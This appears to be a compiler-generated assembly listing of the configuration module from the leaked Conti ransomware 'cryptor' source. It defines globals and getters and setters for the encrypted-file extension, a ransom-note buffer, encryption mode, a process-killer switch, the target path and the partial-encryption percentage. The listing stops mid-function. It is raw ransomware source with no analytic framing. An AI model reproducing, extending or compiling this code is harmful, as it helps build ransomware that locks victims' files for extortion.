; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?g_Extention@@3PA_WA				; g_Extention
PUBLIC	?g_DecryptNote@@3PADA				; g_DecryptNote
PUBLIC	?g_EncryptMode@@3HA				; g_EncryptMode
PUBLIC	?g_IsProcKillerEnabled@@3HA			; g_IsProcKillerEnabled
PUBLIC	?g_EncryptPath@@3PEB_WEB			; g_EncryptPath
PUBLIC	?g_EncryptSize@@3EA				; g_EncryptSize
_BSS	SEGMENT
?g_IsProcKillerEnabled@@3HA DD 01H DUP (?)		; g_IsProcKillerEnabled
	ALIGN	8

?g_EncryptPath@@3PEB_WEB DQ 01H DUP (?)			; g_EncryptPath
_BSS	ENDS
msvcjmc	SEGMENT
__0ED14FEE_winpackagefamily@h DB 01H
__F92EF742_winapifamily@h DB 01H
__22E515EB_sdkddkver@h DB 01H
__FE09AF47_concurrencysal@h DB 01H
__C073CA79_sal@h DB 01H
__D6AFE870_vadefs@h DB 01H
__D63E96CF_vcruntime@h DB 01H
__514B86D7_excpt@h DB 01H
__9A7D38D9_stdarg@h DB 01H
__29F49F40_specstrings_undef@h DB 01H
__D0F42932_specstrings_strict@h DB 01H
__F00405FD_sdv_driverspecs@h DB 01H
__173E09CA_driverspecs@h DB 01H
__9A452361_specstrings@h DB 01H
__1B0272D9_corecrt@h DB 01H
__74484FB3_corecrt_wctype@h DB 01H
__1EC467ED_ctype@h DB 01H
__98517906_kernelspecs@h DB 01H
__D3497022_basetsd@h DB 01H
__61CC25A1_errno@h DB 01H
__3EADF068_vcruntime_string@h DB 01H
__E4C945B4_corecrt_memcpy_s@h DB 01H
__8EAFF484_corecrt_memory@h DB 01H
__6490AEC5_corecrt_wstring@h DB 01H
__E8295E1E_string@h DB 01H
__7FCB5136_guiddef@h DB 01H
__FF8A9E11_pshpack4@h DB 01H
__D5438902_poppack@h DB 01H
__FB07E2A3_pshpack2@h DB 01H
__F6906775_pshpack8@h DB 01H
__F9415CFA_pshpack1@h DB 01H
__E58C6F1C_apiset@h DB 01H
__A5C52262_ktmtypes@h DB 01H
__FBBA8F9D_winnt@h DB 01H
__A32D3D2C_minwindef@h DB 01H
__7D798299_windef@h DB 01H
__9AE108E9_apisetcconv@h DB 01H
__9CE53D2C_minwinbase@h DB 01H
__5D0AA210_apiquery2@h DB 01H
__4DD4E726_processenv@h DB 01H
__3575CC96_fileapi@h DB 01H
__8EA220E6_fileapifromapp@h DB 01H
__BF9B31FE_debugapi@h DB 01H
__C3AFE134_utilapiset@h DB 01H
__76F69E51_handleapi@h DB 01H
__7E63D784_errhandlingapi@h DB 01H
__FFA7003C_fibersapi@h DB 01H
__8971CECF_namedpipeapi@h DB 01H
__46C9D8A6_profileapi@h DB 01H
__98D4F0A3_heapapi@h DB 01H
__50EF2A88_ioapiset@h DB 01H
__92EA1464_synchapi@h DB 01H
__A53D8AED_interlockedapi@h DB 01H
__B506CAAF_processthreadsapi@h DB 01H
__FF735694_sysinfoapi@h DB 01H
__29589789_memoryapi@h DB 01H
__E9C7A663_enclaveapi@h DB 01H
__D035F9F7_threadpoollegacyapiset@h DB 01H
__C899130C_threadpoolapiset@h DB 01H
__E0441EE7_jobapi@h DB 01H
__CEF86838_jobapi2@h DB 01H
__35AC6B9A_wow64apiset@h DB 01H
__C8AE41A5_libloaderapi@h DB 01H
__CC9E232D_securitybaseapi@h DB 01H
__C9D0C9B8_namespaceapi@h DB 01H
__30FF9CAD_systemtopologyapi@h DB 01H
__4D358795_processtopologyapi@h DB 01H
__40446D10_securityappcontainer@h DB 01H
__3A952EDF_realtimeapiset@h DB 01H
__F4865F4B_winerror@h DB 01H
__53C1BD93_timezoneapi@h DB 01H
__1FFBEDBF_winbase@h DB 01H
__43D3FA34_wingdi@h DB 01H
__D24A7391_tvout@h DB 01H
__7713A6C8_winuser@h DB 01H
__0B345F71_datetimeapi@h DB 01H
__9AC6960C_winnls@h DB 01H
__973A40A8_stringapiset@h DB 01H
__CC46FEE2_wincontypes@h DB 01H
__97D70BE1_consoleapi@h DB 01H
__27EC5E18_consoleapi2@h DB 01H
__262E342F_consoleapi3@h DB 01H
__641DCD70_wincon@h DB 01H
__5A96C7A7_verrsrc@h DB 01H
__B69C6FF2_winver@h DB 01H
__7AEB8C37_reason@h DB 01H
__59F1A8A9_winreg@h DB 01H
__EE0E2B7F_wnnc@h DB 01H
__DCDB7054_winnetwk@h DB 01H
__EDC72EEB_cderr@h DB 01H
__95F9199D_dde@h DB 01H
__66427627_ddeml@h DB 01H
__957C29A0_dlgs@h DB 01H
__12EA15AF_lzexpand@h DB 01H
__62131F15_mmsyscom@h DB 01H
__47E68D49_mciapi@h DB 01H
__5D7DD356_mmiscapi@h DB 01H
__7223D2EF_mmiscapi2@h DB 01H
__A330DBB3_playsoundapi@h DB 01H
__601B366F_mmeapi@h DB 01H
__1134ADD5_timeapi@h DB 01H
__93F2265A_joystickapi@h DB 01H
__DF6EB4E3_mmsystem@h DB 01H
__BD641FCB_nb30@h DB 01H
__DF8704F0_rpcdcep@h DB 01H
__5C6CA7BB_rpcdce@h DB 01H
__853533C4_rpcnsi@h DB 01H
__2D2406C3_rpcnterr@h DB 01H
__64521D71_rpcasync@h DB 01H
__AADCBA08_rpc@h DB 01H
__19E26CFF_shellapi@h DB 01H
__1E9F31D3_winperf@h DB 01H
__32C6F875_winsock@h DB 01H
__7953A3F8_bcrypt@h DB 01H
__E4169492_ncrypt@h DB 01H
__AF3DDDC3_dpapi@h DB 01H
__D1E23BF2_wincrypt@h DB 01H
__82AB4779_winefs@h DB 01H
__1FE431C9_rpcnsip@h DB 01H
__2B741F2D_rpcsal@h DB 01H
__92623256_rpcndr@h DB 01H
__9C18532E_wtypesbase@h DB 01H
__EA2E1D6D_wtypes@h DB 01H
__7DDD9F45_winioctl@h DB 01H
__E550A843_winsmcrd@h DB 01H
__9809C1BA_winscard@h DB 01H
__EA174FA4_prsht@h DB 01H
__0E1BD114_winspool@h DB 01H
__45DED006_corecrt_malloc@h DB 01H
__13F5961F_stddef@h DB 01H
__FD6DBD68_corecrt_search@h DB 01H
__E2E33A61_corecrt_wstdlib@h DB 01H
__10D4A829_limits@h DB 01H
__6E5ACABA_stdlib@h DB 01H
__30B1AFDA_unknwnbase@h DB 01H
__328C1996_objidlbase@h DB 01H
__C4E06B6A_cguid@h DB 01H
__434718C5_combaseapi@h DB 01H
__DE6FDEF1_unknwn@h DB 01H
__CCE0BACC_objidl@h DB 01H
__8C7011E5_oaidl@h DB 01H
__2E0B7863_propidlbase@h DB 01H
__BF4CF2EC_coml2api@h DB 01H
__6D897344_oleidl@h DB 01H
__1129FC2C_servprov@h DB 01H
__757952E4_msxml@h DB 01H
__B1191D53_urlmon@h DB 01H
__404D1A47_propidl@h DB 01H
__A1C63593_objbase@h DB 01H
__C1B0A9CB_oleauto@h DB 01H
__24EAF61F_ole2@h DB 01H
__2B1843DA_commdlg@h DB 01H
__81DDEDE3_stralign@h DB 01H
__2134D1B4_winsvc@h DB 01H
__11C07376_mcx@h DB 01H
__577CE3E7_ime_cmodes@h DB 01H
__1E72C31E_imm@h DB 01H
__E15BF856_windows@h DB 01H
__832A4112_inaddr@h DB 01H
__C59B8995_ws2def@h DB 01H
__F9202461_qos@h DB 01H
__50CB22FA_WinSock2@h DB 01H
__32E3D3D2_xkeycheck@h DB 01H
__CFD6EDFA_yvals_core@h DB 01H
__BE6CFB00___msvc_sanitizer_annotate_container@hpp DB 01H
__A3D3E4E8_vcruntime_new@h DB 01H
__8D1A214D_vcruntime_new_debug@h DB 01H
__935DC21B_crtdbg@h DB 01H
__497BC13E_crtdefs@h DB 01H
__DDE8D0E0_use_ansi@h DB 01H
__AE7FBCDF_yvals@h DB 01H
__44420885_corecrt_stdio_config@h DB 01H
__AB601D8D_corecrt_wstdio@h DB 01H
__C1EC35D3_stdio@h DB 01H
__1C5946C5_cstdio DB 01H
__54ADA280_cstring DB 01H
__EF1F6BBA_corecrt_wconio@h DB 01H
__3D1D430C_corecrt_wdirect@h DB 01H
__8ECB7138_corecrt_share@h DB 01H
__DB7FEBA6_corecrt_wio@h DB 01H
__9A9F0068_corecrt_wprocess@h DB 01H
__369A9BC3_corecrt_wtime@h DB 01H
__CE789B9D_types@h DB 01H
__9901C817_stat@h DB 01H
__3FCAD62E_wchar@h DB 01H
__86D29096_cwchar DB 01H
__26E6E2A9_xtr1common DB 01H
__C51215A0_iosfwd DB 01H
__AEA28616_stdint@h DB 01H
__A561EB1D_cstdint DB 01H
__BB16330F_corecrt_math@h DB 01H
__3BF2A406_math@h DB 01H
__183F0A60_cstdlib DB 01H
__B9985323_float@h DB 01H
__6F1D8D42_cfloat DB 01H
__9CD02892_climits DB 01H
__F5A7E1DF_intrin0@inl@h DB 01H
__50567835_intrin0@h DB 01H
__09FBC026_limits DB 01H
__BDF4D0CD_cstddef DB 01H
__7C4A1519_type_traits DB 01H
__FA77ED4C_malloc@h DB 01H
__89766DA4_corecrt_terminate@h DB 01H
__EEF52EF9_eh@h DB 01H
__85F4241F_vcruntime_exception@h DB 01H
__8124AFA8_exception DB 01H
__5003AD96_new DB 01H
__8B28237E_xatomic@h DB 01H
__E4CFD974_initializer_list DB 01H
__2F328FEB_utility DB 01H
__91F58E7E___msvc_iter_core@hpp DB 01H
__C27AFEEB_xutility DB 01H
__45A7EC28_xmemory DB 01H
__31746AB4_xstring DB 01H
__1392A162_cctype DB 01H
__C1864A34_string DB 01H
__9D469CC8_common@h DB 01H
__6A2859B8_global_parameters@h DB 01H
__AE454FA2_lmcons@h DB 01H
__67F5F762_mprapidef@h DB 01H
__1F2B86E1_ipifcons@h DB 01H
__EFFE9D94_ifdef@h DB 01H
__AF31E881_ifmib@h DB 01H
__8BC2807C_nldef@h DB 01H
__7ABE0907_ipmib@h DB 01H
__2E95CCCA_tcpmib@h DB 01H
__2798F2DA_udpmib@h DB 01H
__FCC255DB_iprtrmib@h DB 01H
__B01BC3FD_in6addr@h DB 01H
__D834A143_ipexport@h DB 01H
__0A9237D2_time@h DB 01H
__82EB0637_iptypes@h DB 01H
__6063C472_tcpestats@h DB 01H
__63D3B6A5_netioapi@h DB 01H
__D1674A86_iphlpapi@h DB 01H
__F5D3A320_RestartManager@h DB 01H
__AAAC9FBE_TlHelp32@h DB 01H
__9B49ECA4_getapi@h DB 01H
__62F75DE5_metarandom2@h DB 01H
__93160BA8_array DB 01H
__722C6D77_MetaString@h DB 01H
__457AF2B3_logs@h DB 01H
__4DC440E3_global_parameters@cpp DB 01H
msvcjmc	ENDS
_DATA	SEGMENT
?g_Extention@@3PA_WA DB '.', 00H, 'E', 00H, 'X', 00H, 'T', 00H, 'E', 00H, 'N'
	DB	00H, 00H, 00H				; g_Extention
?g_EncryptSize@@3EA DB 032H				; g_EncryptSize
	ORG $+1
?g_DecryptNote@@3PADA DB '__DECRYPT_NOTE__', 00H	; g_DecryptNote
	ORG $+2031
?g_EncryptMode@@3HA DD 0aH				; g_EncryptMode
_DATA	ENDS
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
PUBLIC	?GetExtention@global@@YAPEA_WXZ			; global::GetExtention
PUBLIC	?GetDecryptNote@global@@YAPEADXZ		; global::GetDecryptNote
PUBLIC	?GetMutexName@global@@YAPEADXZ			; global::GetMutexName
PUBLIC	?SetEncryptMode@global@@YAXH@Z			; global::SetEncryptMode
PUBLIC	?GetEncryptMode@global@@YAHXZ			; global::GetEncryptMode
PUBLIC	?SetProcKiller@global@@YAXH@Z			; global::SetProcKiller
PUBLIC	?GetProcKiller@global@@YAHXZ			; global::GetProcKiller
PUBLIC	?SetEncryptPath@global@@YAXPEB_W@Z		; global::SetEncryptPath
PUBLIC	?GetEncryptPath@global@@YAPEB_WXZ		; global::GetEncryptPath
PUBLIC	?SetEncryptSize@global@@YAHH@Z			; global::SetEncryptSize
PUBLIC	?GetEncryptSize@global@@YAEXZ			; global::GetEncryptSize
PUBLIC	__JustMyCode_Default
EXTRN	_RTC_InitBase:PROC
EXTRN	_RTC_Shutdown:PROC
EXTRN	__CheckForDebuggerJustMyCode:PROC
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetExtention@global@@YAPEA_WXZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$?GetExtention@global@@YAPEA_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetDecryptNote@global@@YAPEADXZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$?GetDecryptNote@global@@YAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetMutexName@global@@YAPEADXZ DD imagerel $LN3
	DD	imagerel $LN3+39
	DD	imagerel $unwind$?GetMutexName@global@@YAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?SetEncryptMode@global@@YAXH@Z DD imagerel $LN3
	DD	imagerel $LN3+52
	DD	imagerel $unwind$?SetEncryptMode@global@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetEncryptMode@global@@YAHXZ DD imagerel $LN3
	DD	imagerel $LN3+43
	DD	imagerel $unwind$?GetEncryptMode@global@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?SetProcKiller@global@@YAXH@Z DD imagerel $LN3
	DD	imagerel $LN3+52
	DD	imagerel $unwind$?SetProcKiller@global@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetProcKiller@global@@YAHXZ DD imagerel $LN3
	DD	imagerel $LN3+43
	DD	imagerel $unwind$?GetProcKiller@global@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?SetEncryptPath@global@@YAXPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+55
	DD	imagerel $unwind$?SetEncryptPath@global@@YAXPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetEncryptPath@global@@YAPEB_WXZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$?GetEncryptPath@global@@YAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?SetEncryptSize@global@@YAHH@Z DD imagerel $LN5
	DD	imagerel $LN5+177
	DD	imagerel $unwind$?SetEncryptSize@global@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetEncryptSize@global@@YAEXZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$?GetEncryptSize@global@@YAEXZ
pdata	ENDS
;	COMDAT rtc$TMZ
rtc$TMZ	SEGMENT
_RTC_Shutdown.rtc$TMZ DQ FLAT:_RTC_Shutdown
rtc$TMZ	ENDS
;	COMDAT rtc$IMZ
rtc$IMZ	SEGMENT
_RTC_InitBase.rtc$IMZ DQ FLAT:_RTC_InitBase
rtc$IMZ	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetEncryptSize@global@@YAEXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?SetEncryptSize@global@@YAHH@Z DD 025051201H
	DD	010d2312H
	DD	07006001dH
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetEncryptPath@global@@YAPEB_WXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?SetEncryptPath@global@@YAXPEB_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetProcKiller@global@@YAHXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?SetProcKiller@global@@YAXH@Z DD 025051201H
	DD	010d2312H
	DD	07006001dH
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetEncryptMode@global@@YAHXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?SetEncryptMode@global@@YAXH@Z DD 025051201H
	DD	010d2312H
	DD	07006001dH
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetMutexName@global@@YAPEADXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetDecryptNote@global@@YAPEADXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetExtention@global@@YAPEA_WXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
; Function compile flags: /Odt
;	COMDAT __JustMyCode_Default
_TEXT	SEGMENT
__JustMyCode_Default PROC				; COMDAT
  00000	c2 00 00	 ret	 0
__JustMyCode_Default ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?GetEncryptSize@global@@YAEXZ
_TEXT	SEGMENT
?GetEncryptSize@global@@YAEXZ PROC			; global::GetEncryptSize, COMDAT

; 94   : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 95   : 	return g_EncryptSize;

  0001b	0f b6 05 00 00
	00 00		 movzx	 eax, BYTE PTR ?g_EncryptSize@@3EA ; g_EncryptSize

; 96   : }

  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
?GetEncryptSize@global@@YAEXZ ENDP			; global::GetEncryptSize
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?SetEncryptSize@global@@YAHH@Z
_TEXT	SEGMENT
Size$ = 224
?SetEncryptSize@global@@YAHH@Z PROC			; global::SetEncryptSize, COMDAT

; 70   : {

$LN5:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 71   : 	if (Size != 10 ||
; 72   : 		Size != 15 ||
; 73   : 		Size != 20 ||
; 74   : 		Size != 25 ||
; 75   : 		Size != 30 ||
; 76   : 		Size != 35 ||
; 77   : 		Size != 40 ||
; 78   : 		Size != 45 ||
; 79   : 		Size != 50 ||
; 80   : 		Size != 60 ||
; 81   : 		Size != 70 ||

  0001e	83 bd e0 00 00
	00 0a		 cmp	 DWORD PTR Size$[rbp], 10
  00025	75 63		 jne	 SHORT $LN3@SetEncrypt
  00027	83 bd e0 00 00
	00 0f		 cmp	 DWORD PTR Size$[rbp], 15
  0002e	75 5a		 jne	 SHORT $LN3@SetEncrypt
  00030	83 bd e0 00 00
	00 14		 cmp	 DWORD PTR Size$[rbp], 20
  00037	75 51		 jne	 SHORT $LN3@SetEncrypt
  00039	83 bd e0 00 00
	00 19		 cmp	 DWORD PTR Size$[rbp], 25
  00040	75 48		 jne	 SHORT $LN3@SetEncrypt
  00042	83 bd e0 00 00
	00 1e		 cmp	 DWORD PTR Size$[rbp], 30
  00049	75 3f		 jne	 SHORT $LN3@SetEncrypt
  0004b	83 bd e0 00 00
	00 23		 cmp	 DWORD PTR Size$[rbp], 35 ; 00000023H
  00052	75 36		 jne	 SHORT $LN3@SetEncrypt
  00054	83 bd e0 00 00
	00 28		 cmp	 DWORD PTR Size$[rbp], 40 ; 00000028H
  0005b	75 2d		 jne	 SHORT $LN3@SetEncrypt
  0005d	83 bd e0 00 00
	00 2d		 cmp	 DWORD PTR Size$[rbp], 45 ; 0000002dH
  00064	75 24		 jne	 SHORT $LN3@SetEncrypt
  00066	83 bd e0 00 00
	00 32		 cmp	 DWORD PTR Size$[rbp], 50 ; 00000032H
  0006d	75 1b		 jne	 SHORT $LN3@SetEncrypt
  0006f	83 bd e0 00 00
	00 3c		 cmp	 DWORD PTR Size$[rbp], 60 ; 0000003cH
  00076	75 12		 jne	 SHORT $LN3@SetEncrypt
  00078	83 bd e0 00 00
	00 46		 cmp	 DWORD PTR Size$[rbp], 70 ; 00000046H
  0007f	75 09		 jne	 SHORT $LN3@SetEncrypt
  00081	83 bd e0 00 00
	00 50		 cmp	 DWORD PTR Size$[rbp], 80 ; 00000050H
  00088	74 0b		 je	 SHORT $LN2@SetEncrypt
$LN3@SetEncrypt:

; 82   : 		Size != 80)
; 83   : 	{
; 84   : 		g_EncryptSize = 50;

  0008a	c6 05 00 00 00
	00 32		 mov	 BYTE PTR ?g_EncryptSize@@3EA, 50 ; g_EncryptSize, 00000032H

; 85   : 		return FALSE;

  00091	33 c0		 xor	 eax, eax
  00093	eb 12		 jmp	 SHORT $LN1@SetEncrypt
$LN2@SetEncrypt:

; 86   : 	}
; 87   : 
; 88   : 	g_EncryptSize = (BYTE)Size;

  00095	0f b6 85 e0 00
	00 00		 movzx	 eax, BYTE PTR Size$[rbp]
  0009c	88 05 00 00 00
	00		 mov	 BYTE PTR ?g_EncryptSize@@3EA, al ; g_EncryptSize

; 89   : 	return TRUE;

  000a2	b8 01 00 00 00	 mov	 eax, 1
$LN1@SetEncrypt:

; 90   : }

  000a7	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  000ae	5f		 pop	 rdi
  000af	5d		 pop	 rbp
  000b0	c3		 ret	 0
?SetEncryptSize@global@@YAHH@Z ENDP			; global::SetEncryptSize
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?GetEncryptPath@global@@YAPEB_WXZ
_TEXT	SEGMENT
?GetEncryptPath@global@@YAPEB_WXZ PROC			; global::GetEncryptPath, COMDAT

; 64   : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 65   : 	return g_EncryptPath;

  0001b	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR ?g_EncryptPath@@3PEB_WEB ; g_EncryptPath

; 66   : }

  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
?GetEncryptPath@global@@YAPEB_WXZ ENDP			; global::GetEncryptPath
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?SetEncryptPath@global@@YAXPEB_W@Z
_TEXT	SEGMENT
Path$ = 224
?SetEncryptPath@global@@YAXPEB_W@Z PROC			; global::SetEncryptPath, COMDAT

; 58   : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 59   : 	g_EncryptPath = Path;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR Path$[rbp]
  00026	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_EncryptPath@@3PEB_WEB, rax ; g_EncryptPath

; 60   : }

  0002d	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00034	5f		 pop	 rdi
  00035	5d		 pop	 rbp
  00036	c3		 ret	 0
?SetEncryptPath@global@@YAXPEB_W@Z ENDP			; global::SetEncryptPath
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?GetProcKiller@global@@YAHXZ
_TEXT	SEGMENT
?GetProcKiller@global@@YAHXZ PROC			; global::GetProcKiller, COMDAT

; 52   : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 53   : 	return g_IsProcKillerEnabled;

  0001b	8b 05 00 00 00
	00		 mov	 eax, DWORD PTR ?g_IsProcKillerEnabled@@3HA ; g_IsProcKillerEnabled

; 54   : }

  00021	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00028	5f		 pop	 rdi
  00029	5d		 pop	 rbp
  0002a	c3		 ret	 0
?GetProcKiller@global@@YAHXZ ENDP			; global::GetProcKiller
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?SetProcKiller@global@@YAXH@Z
_TEXT	SEGMENT
IsEnabled$ = 224
?SetProcKiller@global@@YAXH@Z PROC			; global::SetProcKiller, COMDAT

; 46   : {

$LN3:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 47   : 	g_IsProcKillerEnabled = IsEnabled;

  0001e	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR IsEnabled$[rbp]
  00024	89 05 00 00 00
	00		 mov	 DWORD PTR ?g_IsProcKillerEnabled@@3HA, eax ; g_IsProcKillerEnabled

; 48   : }

  0002a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00031	5f		 pop	 rdi
  00032	5d		 pop	 rbp
  00033	c3		 ret	 0
?SetProcKiller@global@@YAXH@Z ENDP			; global::SetProcKiller
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?GetEncryptMode@global@@YAHXZ
_TEXT	SEGMENT
?GetEncryptMode@global@@YAHXZ PROC			; global::GetEncryptMode, COMDAT

; 40   : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__4DC440E3_global_parameters@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 41   : 	return g_EncryptMode;

  0001b	8b 05 00 00 00
	00		 mov	 eax, DWORD PTR ?g_EncryptMode@@3HA ; g_EncryptMode

; 42   : }

  00021	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00028	5f		 pop	 rdi
  00029	5d		 pop	 rbp
  0002a	c3		 ret	 0
?GetEncryptMode@global@@YAHXZ ENDP			; global::GetEncryptMode
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\global\global_parameters.cpp
;	COMDAT ?SetEncryptMode@global@@YAXH@Z
_TEXT	SEGMENT
EncryptMode$ = 224
?SetEncryptMode@global@@YAXH@Z PROC			; global::SetEncryptMode, COMDAT

; 34   : {

$LN3:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
